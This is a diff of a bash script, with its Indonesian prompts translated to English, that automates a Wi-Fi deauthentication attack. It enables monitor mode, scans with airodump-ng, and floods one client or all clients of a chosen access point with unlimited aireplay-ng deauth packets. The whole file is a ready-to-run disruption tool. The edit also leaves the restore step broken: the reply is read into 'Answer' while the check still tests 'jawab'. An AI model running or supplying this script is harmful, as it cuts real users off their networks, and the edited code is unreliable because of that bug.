@@ -3,51 +3,51 @@
 # Ganti interface dengan interfacemu
 IFACE="wlp3s0"
 
-echo "[*] Mengaktifkan monitor mode..."
+echo "[*] Activate monitor mode..."
 sudo ip link set $IFACE down
 sudo iw dev $IFACE set type monitor
 sudo ip link set $IFACE up
 
-echo "[*] Menjalankan airodump-ng (tekan Ctrl+C jika sudah menemukan target)..."
+echo "[*] Running airodump-ng (tekan Ctrl+C jika sudah menemukan target)..."
 sleep 2
 sudo airodump-ng $IFACE
 
 echo
-read -p "[?] Masukkan BSSID target (WiFi AP): " BSSID
-read -p "[?] Masukkan channel (CH): " CH
+read -p "[?] Enter BSSID target (WiFi AP): " BSSID
+read -p "[?] Enter channel (CH): " CH
 
 echo
-echo "[1] Deauth ke 1 klien saja"
-echo "[2] Deauth ke SEMUA klien"
-read -p "[?] Pilih mode serangan (1/2): " MODE
+echo "[1] 1 Target"
+echo "[2] All Target"
+read -p "[?] Chose Attacking Mode (1/2): " MODE
 
 if [ "$MODE" == "1" ]; then
-    read -p "[?] Masukkan MAC address klien: " CLIENT
+    read -p "[?] Enter Client MAC address: " CLIENT
 fi
 
-echo "[*] Mengatur channel ke $CH..."
+echo "[*] Set channel to $CH..."
 sudo iwconfig $IFACE channel $CH
 sleep 1
 
 echo
 if [ "$MODE" == "1" ]; then
-    echo "[*] Menjalankan deauth terus-menerus ke klien $CLIENT..."
+    echo "[*] Running Deauth Continuously to Target $CLIENT..."
     sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $IFACE
 else
-    echo "[*] Menjalankan deauth terus-menerus ke SEMUA klien..."
+    echo "[*] Running Deauth Continuously to All Target..."
     sudo aireplay-ng --deauth 0 -a $BSSID $IFACE
 fi
 
 echo
-read -p "[?] Apakah ingin mengembalikan interface ke mode normal? (y/n): " jawab
+read -p "[?] Would you like to set interface to normal mode? (y/n): " Answer
 
 if [[ "$jawab" == "y" || "$jawab" == "Y" ]]; then
-    echo "[*] Mengembalikan ke managed mode..."
+    echo "[*] Return to Normal mode..."
     sudo ip link set $IFACE down
     sudo iw dev $IFACE set type managed
     sudo ip link set $IFACE up
-    echo "[✔] Interface kembali ke mode normal."
+    echo "[✔] Interface Return to Normal mode."
 else
-    echo "[!] Interface tetap dalam mode monitor."
+    echo "[!] Interface Keep in Monitor mode."
 fi
 
